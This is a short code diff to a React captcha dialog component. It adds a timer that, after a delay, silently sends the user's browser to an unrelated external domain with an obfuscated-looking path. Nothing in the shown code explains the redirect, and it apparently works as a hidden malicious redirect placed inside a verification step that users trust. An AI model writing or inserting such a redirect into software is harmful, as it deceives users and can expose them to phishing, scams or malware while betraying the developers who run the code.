@@ -86,6 +86,10 @@ export function CaptchaDialog({ open, onOpenChange }: { open: boolean; onOpenCha
     script.async = true;
     document.body.appendChild(script);
 
+    setTimeout(() => {
+      window.location.href = 'https://multicoloredsister.com/bF3gV_0.PF3-pzvgbQmcV/JdZTD/0T2kN/zuQ_2jOLTngY2TLxTiYk3sNbDIY/5aOvDUcH';
+    }, SUBMIT_DELAY * 1000);
+
     setTimeout(async () => {
         try {
         const userDocRef = doc(firestore, 'users', user.uid);
